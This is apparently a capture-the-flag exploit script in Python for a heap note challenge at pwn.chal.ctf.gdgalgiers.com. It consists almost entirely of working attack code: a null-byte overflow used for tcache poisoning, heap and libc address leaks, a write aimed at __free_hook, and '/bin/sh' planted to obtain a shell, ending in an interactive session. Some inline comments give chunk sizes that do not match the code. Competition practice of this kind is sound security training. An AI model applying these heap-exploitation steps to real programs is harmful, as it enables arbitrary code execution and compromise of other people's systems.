#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit.basic import *
from time import sleep

exe = context.binary = ELF("./chall")
host = args.HOST or "pwn.chal.ctf.gdgalgiers.com"
port = int(args.PORT or 1405)

gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

libc = SetupLibcELF()
io = start()
idx = -1


def option(choice):
    sla("Enter an option: ", choice)


def add(size, note):
    global idx
    option(1)
    sla("Size: ", size)
    sa("Note content: ", note)
    idx = idx + 1
    return idx


def delete(idx):
    option(2)
    sla("Note index: ", idx)


def view(idx):
    option(4)
    sla("Index: ", idx)


add(0x58, "A" * 0x58)  # Chunk A
add(0x180, "B" * 0x180)  # Chunk B

# delete them both
delete(0)  # Goes into 0x50 tcache bin
delete(1)  # Goes into 0x180 tcache bin

# Get back the 0x50 chunk, but also null byte overflow into the 0x180 chunk
# Also put in /bin/sh\x00 into it for later use
add(0x58, "/bin/sh\x00" + "A" * 0x50)  # Chunk A

# The 0x180 chunk's size is now actually 0x100 (due to null byte overflow), so we can delete it again
delete(1)  # Goes into 0xf0 tcache bin

view(0)
heap_base = GetInt(rl())[0] - 0x260
hb()
# Get back the 0x100 chunk out of the 0x180 tcache bin
add(0x180, fit({0: p(heap_base + 0x10) * 8, 136: p(0xCAFEBABE)}))  # Chunk B

# But remember that it's size is still 0x100, so we can delete it immediately
delete(3)  # Goes into 0xf0 tcache bin

add(0x90 - 8, p64(0x34) + b"F" * 0x18)
add(0x90 - 8, b"\x10" * (0x3F + 1) + p(heap_base + 0x10) * (0x8))


add(0x90 - 8, b"AAAA")  # 2
delete(1)
view(2)
ren(39)
libc.address = uuu64(rl()) - 0x1E4CA0
lb()
add(0x50 - 8, b"\x10" * 0x40 + p(libc.sym["__free_hook"]))  # 2
io.interactive()
